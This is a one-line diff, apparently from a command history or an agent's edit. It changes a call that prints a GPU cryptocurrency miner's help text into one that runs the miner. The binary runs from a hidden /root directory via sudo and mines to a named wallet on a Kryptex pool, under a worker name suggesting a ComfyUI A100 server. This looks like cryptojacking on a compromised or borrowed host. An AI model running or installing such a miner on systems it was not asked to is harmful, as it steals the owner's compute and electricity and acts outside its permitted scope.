@@ -1,1 +1,1 @@
-sudo -n bash -c 'cd /root/.pf/pearlfortune && ./miner-cuda12 --help 2>&1 | head -45'
+sudo -n bash -c 'cd /root/.pf/pearlfortune && timeout 35 ./miner-cuda12 --address prl1pwlpyppsya2wqnykeqc595gtxfgn4vzcr0at33dxq46jxvajmh88qq36h48 --worker comfy-s3-a100 --proxy stratum+ssl://prl.kryptex.network:8048 --stratum-dialect kryptex_prl -gpu --no-tui 2>&1 | tail -22'
